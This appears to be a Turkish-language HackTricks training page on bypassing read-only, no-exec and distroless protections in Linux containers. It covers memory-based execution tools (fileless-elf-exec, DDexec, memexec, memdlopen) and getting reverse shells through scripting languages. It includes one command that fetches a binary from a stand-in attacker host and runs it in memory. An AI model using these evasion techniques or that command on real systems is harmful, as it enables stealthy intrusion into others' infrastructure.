# FS korumalarını atlatma: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Videolar

Aşağıdaki videolarda bu sayfada bahsedilen teknikler daha derinlemesine açıklanmaktadır:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec senaryosu

Linux makinelerinin özellikle container'larda **read-only (ro) file system koruması** ile mount edilmiş olması giderek daha yaygınlaşıyor. Bunun nedeni, bir container'ı ro file system ile çalıştırmanın `securitycontext` içinde **`readOnlyRootFilesystem: true`** ayarını yapmak kadar kolay olmasıdır:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ancak, file system ro olarak mount edilmiş olsa bile **`/dev/shm`** hâlâ yazılabilir olacaktır; yani diske hiçbir şey yazamayacağımız yönünde bir yanılsama vardır. Bununla birlikte, bu klasör **no-exec koruması ile mount edilir**, bu yüzden buraya bir binary indirirseniz **çalıştıramazsınız**.

> [!WARNING]
> Red team açısından bakıldığında, bu durum sistemde zaten olmayan (ör. backdoor'lar veya `kubectl` gibi enumeration araçları) binary'leri **indirmek ve çalıştırmayı zorlaştırır**.

## En kolay bypass: Scripts

Binarylerden bahsettiğimi unutmayın, eğer interpreter makinede mevcutsa herhangi bir script'i **çalıştırabilirsiniz**, örneğin `sh` varsa bir **shell script**, veya `python` yüklüyse bir **python script**.

Ancak bu, binary backdoor'unuzu veya çalıştırmanız gereken diğer binary araçları çalıştırmak için her zaman yeterli değildir.

## Bellek Bypassları

Binary çalıştırmak istiyorsanız ama file system buna izin vermiyorsa, en iyi yol onu **bellekten çalıştırmaktır**, çünkü bu korumalar belleğe uygulanmaz.

### FD + exec syscall bypass

Makinede Python, Perl veya Ruby gibi güçlü script motorları varsa, binary'yi bellekte çalıştırmak üzere indirip bir memory file descriptor'a (`create_memfd` syscall) koyabilirsiniz; bu fd bu korumalardan etkilenmez ve ardından **fd'yi çalıştırılacak dosya olarak belirten bir `exec` syscall** çağrısı yapılabilir.

Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Bir binary verirsiniz ve seçilen dilde, binary'nin **sıkıştırılmış ve b64 ile kodlanmış** halini içeren; bunları **decode ve decompress** edip `create_memfd` syscall ile oluşturulan bir **fd'ye** yazma ve çalıştırmak için **exec** syscall çağrısı içeren bir script üretecektir.

> [!WARNING]
> Bu, PHP veya Node gibi diğer scripting dillerinde çalışmaz çünkü bu dillerde raw syscall çağırmanın **varsayılan bir yolu** yoktur; bu yüzden `create_memfd` çağrıp binary'yi saklayacak **memory fd** oluşturmak mümkün değildir.
>
> Ayrıca, `/dev/shm` içinde normal bir fd oluşturmak işe yaramaz, çünkü bunu çalıştırmanıza izin verilmeyecektir; **no-exec koruması** uygulanır.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) kendi prosesinizin belleğini, yani **`/proc/self/mem`**'i overwrite ederek değiştirmenize izin veren bir tekniktir.

Böylece, proses tarafından yürütülen assembly kodunu **kontrol ederek**, bir **shellcode** yazabilir ve prosesi "mutate" ederek **herhangi bir arbitrary kodu** çalıştırmasını sağlayabilirsiniz.

> [!TIP]
> **DDexec / EverythingExec**, kendi **shellcode**'unuzu veya **bellekten** herhangi bir **binary**'yi yükleyip **çalıştırmanıza** olanak verir.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Bu teknik hakkında daha fazla bilgi için Github'a bakın veya:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) DDexec'in doğal sonraki adımıdır. Bu, bir **DDexec shellcode demonised**'dir; bu yüzden her seferinde **run a different binary** istediğinizde DDexec'i yeniden başlatmanıza gerek yoktur, DDexec tekniği ile memexec shellcode'u çalıştırıp sonra bu deamon ile **communicate with this deamon to pass new binaries to load and run** yapabilirsiniz.

**memexec to execute binaries from a PHP reverse shell** kullanımıyla ilgili bir örneği [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulabilirsiniz.

### Memdlopen

DDexec ile benzer bir amaç taşıyan [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, ikili dosyaları belleğe yükleyip daha sonra çalıştırmak için **daha kolay bir yol** sağlar. Hatta bağımlılıkları olan binaries'leri bile yüklemeye imkan tanıyabilir.

## Distroless Bypass

Distroless'in gerçekte ne olduğu, ne zaman yardımcı olduğu, ne zaman olmadığı ve konteynerlerde post-exploitation tradecraft'i nasıl değiştirdiği hakkında ayrıntılı bir açıklama için bakın:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### Distroless nedir

Distroless konteynerler yalnızca belirli bir uygulamayı veya servisi çalıştırmak için gerekli olan **en az bileşenleri**, örneğin kütüphaneler ve runtime bağımlılıkları içerir; ancak package manager, shell veya system utilities gibi daha büyük bileşenleri hariç tutar.

Distroless konteynerlerin amacı, gereksiz bileşenleri ortadan kaldırarak konteynerlerin saldırı yüzeyini **azaltmak** ve sömürülebilecek zafiyet sayısını en aza indirmektir.

### Reverse Shell

Bir distroless konteynerde normal bir shell almak için **`sh` veya `bash` bile bulamayabilirsiniz**. Ayrıca `ls`, `whoami`, `id` gibi ikili programları da bulamazsınız... sistemde genellikle çalıştırdığınız her şey eksik olabilir.

> [!WARNING]
> Bu nedenle, normalde yaptığınız gibi bir **reverse shell** elde edemeyecek veya sistemi **enumerate** edemeyeceksiniz.

Ancak, örneğin ele geçirilmiş konteyner bir flask web uygulaması çalıştırıyorsa python yüklü olacaktır ve bu yüzden bir **Python reverse shell** alabilirsiniz. Node çalıştırıyorsa bir Node rev shell alabilirsiniz ve çoğunlukla herhangi bir **scripting language** ile durum benzerdir.

> [!TIP]
> Scripting language'ı kullanarak dilin sunduğu yeteneklerle sistemi **enumerate** edebilirsiniz.

Eğer **`read-only/no-exec`** korumaları yoksa reverse shell'inizi suistimal ederek dosya sistemine **binary'lerinizi yazabilir** ve bunları **çalıştırabilirsiniz**.

> [!TIP]
> Ancak bu tür konteynerlerde bu korumalar genellikle bulunur; bunları atlatmak için **önceki bellek yürütme tekniklerini** kullanabilirsiniz.

Scripting dilleriyle **reverse shells** elde etmek ve bellekten binaries çalıştırmak için bazı **RCE zafiyetlerini exploit etme** örneklerini [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde bulabilirsiniz.


{{#include ../../../banners/hacktricks-training.md}}
